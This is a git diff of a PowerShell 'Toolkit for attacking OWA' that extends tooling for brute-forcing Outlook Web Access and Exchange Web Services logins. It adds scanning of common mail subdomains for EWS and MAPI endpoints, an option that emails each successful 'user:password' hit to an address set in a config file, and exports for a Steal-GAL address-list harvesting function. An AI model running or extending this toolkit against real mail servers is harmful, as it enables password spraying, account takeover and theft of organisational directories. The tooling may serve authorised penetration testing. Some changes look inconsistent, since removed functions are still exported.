@@ -1,5 +1,12 @@
 # Toolkit for attacking OWA
-# author @slobtresix0, @curi0usJack
+# author @slobtresix0, @curi0usJack, @glitch1101
+
+#create a conf file and put its path in the send-notification function if you want notifications
+#sample conf format:
+#
+#smtpServer = "10.10.10.10"
+#notifyAddress = "email@email.com"
+#
 
 function Write-Message($message, $type)
 {
@@ -76,7 +83,10 @@ function OTK-Init
 	  [string]$Brute,
 
       [Parameter(Mandatory=$false)]
-	  [string]$UserMode
+	  [string]$UserMode,
+
+      [Parameter(Mandatory=$false)]
+	  [bool]$Notify
 
 	)
 
@@ -85,7 +95,7 @@ function OTK-Init
 	{
 	    Try 
 	    {
-	        $dllPath = "C:\Program Files (x86)\Microsoft\Exchange\Web Services\2.1\Microsoft.Exchange.WebServices.dll"
+	        $dllPath = "C:\Program Files\Microsoft\Exchange\Web Services\2.1\Microsoft.Exchange.WebServices.dll"
 	        Import-Module -Name $dllPath -ErrorAction Stop
 	    }
 	    Catch 
@@ -204,7 +214,9 @@ if ($Brute -eq $True)
     #test inbox
 	$inboxFolderName = [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox
 	$inboxFolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($exchService,$inboxFolderName)
-    $output = "[*] Success! Authenticated with " + $User + ":" + $Password + " User has " + $inboxFolder.UnreadCount + " unread emails."
+    $unread = $inboxFolder.UnreadCount
+    #$nothing = Send-Notification -Message "[*] Success! Authenticated with $User : $Password User has $unread unread emails."
+    $output = "[*] Success! Authenticated with $User : $Password User has $unread unread emails."
 
     }
     catch
@@ -214,6 +226,7 @@ if ($Brute -eq $True)
        $output = "[!] Fail! With " + $User + ":" + $Password
          
     }
+
 
     return $output
 }
@@ -243,38 +256,6 @@ function Get-OWAVersion ($baseurl)
 		{ return "OWA_2013" }
 	else
 		{ return "Unknown" }
-}
-
-function Get-ewsPath 
-{
-	# Quick script to check dns records for EWS capability
-	Param
-	(
-	  [Parameter(Mandatory=$true)]
-	  [string]$domain
-	)
-	[string]$autoCheck = "autodiscover." + $domain
-	$owaBase = resolve-dnsname -Server 8.8.8.8 -Name $autoCheck
-	$ewsPath = "https://" + $owaBase.NameHost + "/EWS/Exchange.asmx"
-	
-	#write-host "[*] EWS Path: " + $ewsPath
-	return $ewsPath
-}
-
-function Get-owaPath 
-{
-	# Quick script to check dns records for EWS capability
-	Param
-	(
-	  [Parameter(Mandatory=$true)]
-	  [string]$domain
-	)
-	[string]$autoCheck = "autodiscover." + $domain
-	$owaBase = resolve-dnsname -Server 8.8.8.8 -Name $autoCheck
-	$owaPath = "https://" + $owaBase.NameHost + "/owa"
-
-	#write-host "[*] OWA Path: " + $owaPath
-	return $owaPath
 }
 
 function Steal-GAL
@@ -734,11 +715,14 @@ function Brute-EWS
 	  [string]$UserAsPass,
 
       [Parameter(Mandatory=$false)]
-	  [string]$PasswordList
+	  [string]$PasswordList,
+
+      [Parameter(Mandatory=$false)]
+	  [bool]$Notify
 
 	)
 
-$PasswordList = gc -Path $PasswordList
+
 
 $Brute = $True
 $cmdPath = $env:temp + "\OTK-Init.ps1" 
@@ -752,6 +736,177 @@ Multi-Thread -Command $cmdPath -ObjectList (get-content $TargetList) -InputParam
 
 }
 
+function Scan-EWS
+{
+
+	Param
+	(
+       
+	  [Parameter(Mandatory=$true)]
+	  [string]$Domain
+
+	)
+
+#dirty hack for self-signed certificates
+#[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+
+    $bruteDoms = "mail","exchange","webmail","mail","mail2","owa","mymail","secure","remote","seg","exchangeseg","autodiscover"
+
+    foreach ($subdomain in $bruteDoms)
+    {
+         $target = $subdomain + "." + $domain
+         Write-Verbose "[*] Resolving Target:$target"
+         
+         try
+         {
+            $result = [System.net.dns]::GetHostByName($target)
+            [array]$results += $result.HostName
+         }
+         catch
+         {
+           Write-Verbose "Resolution Failed"
+           continue
+         }
+    }
+
+    foreach ($found in $results)
+    {
+      #write-host "[*] Found possible EWS subdomains:"
+      #write-host "    [+]" $found
+      #write-host "[*] Testing for EWS"
+      try 
+      {
+        $ewsPath = "https://$found/EWS/Exchange.asmx"
+        $request = [System.Net.WebRequest]::Create($ewsPath)
+        $request.Timeout = 2000
+        $response = $request.GetResponse()
+
+      }
+      catch
+      {
+        $responseCode = Failure($ewsPath)
+        #write-host $responseCode "catch response code"
+        if($responseCode -eq "401")
+        {
+          write-host "[*] Found Possible EWS at: $ewsPath"
+        }
+      }
+
+    }
+
+}
+
+function Scan-MAPI
+{
+
+	Param
+	(
+       
+	  [Parameter(Mandatory=$true)]
+	  [string]$Domain
+
+	)
+
+#dirty hack for self-signed certificates
+#[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+
+    $bruteDoms = "mail","exchange","webmail","mail","mail2","owa","mymail","secure","remote","seg","exchangeseg","autodiscover"
+
+    foreach ($subdomain in $bruteDoms)
+    {
+         $target = $subdomain + "." + $domain
+         Write-Verbose "[*] Resolving Target:$target"
+         
+         try
+         {
+            $result = [System.net.dns]::GetHostByName($target)
+            [array]$results += $result.HostName
+         }
+         catch
+         {
+           Write-Verbose "Resolution Failed"
+           continue
+         }
+    }
+
+    foreach ($found in $results)
+    {
+      #write-host "[*] Found possible EWS subdomains:"
+      #write-host "    [+]" $found
+      #write-host "[*] Testing for EWS"
+      try 
+      {
+        $Path = "https://$found/mapi"
+        $request = [System.Net.WebRequest]::Create($Path)
+        $request.Timeout = 2000
+        $response = $request.GetResponse()
+
+      }
+      catch
+      {
+        
+        $responseCode = Failure($Path)
+        #write-host $responseCode "catch response code"
+        if($responseCode -eq "401")
+        {
+          write-host "[*] Found Possible MAPI at: $Path"
+        }
+      }
+
+    }
+
+}
+function Failure 
+{
+    Param
+	(
+       
+	  [Parameter(Mandatory=$false)]
+	  [string]$Path
+
+	)
+
+  $exception = [string]$_
+
+  if($exception -like "*error*")
+  {
+  $exceptionArray = $exception.split(":")
+  #write-host $exceptionArray
+  $responseCode = $exceptionArray[2].split(" ")[1]
+  $responseCode = $responseCode.Replace("(","").Replace(")","")
+  return $responseCode
+  }
+  else 
+  {
+    Write-Verbose "[-] Path: $Path $exception"
+    return $responseCode = "connection fail"  
+  }
+}
+
+function Send-Notification
+{
+    Param
+	(
+       
+	  [Parameter(Mandatory=$true)]
+	  [string]$Message
+
+	)
+
+    $confPath = "C:\programData\owa-toolkit\otk.conf"
+
+    if(Test-Path $confPath)
+    {
+        #get things needed to send notification
+        $conf = gc $confPath
+        $smtpServer = $conf[0].split(" ")[2].replace('"',"")
+        $notifyAddress = $conf[1].Split("")[2].replace('"',"")
+        Send-MailMessage -From "owa_brute@brute.com" -SmtpServer $smtpServer -Subject $Message -To $notifyAddress
+    }
+}
+
 Export-ModuleMember OTK-Init
 Export-ModuleMember Get-ewsPath
 Export-ModuleMember Get-owaPath
@@ -761,3 +916,7 @@ Export-ModuleMember Write-Message
 Export-ModuleMember Get-OWaVersion
 Export-ModuleMember Steal-GAL
 Export-ModuleMember New-GAL
+Export-ModuleMember Scan-MAPI
+Export-ModuleMember Scan-EWS
+Export-ModuleMember Send-Notification
+Export-ModuleMember Failure
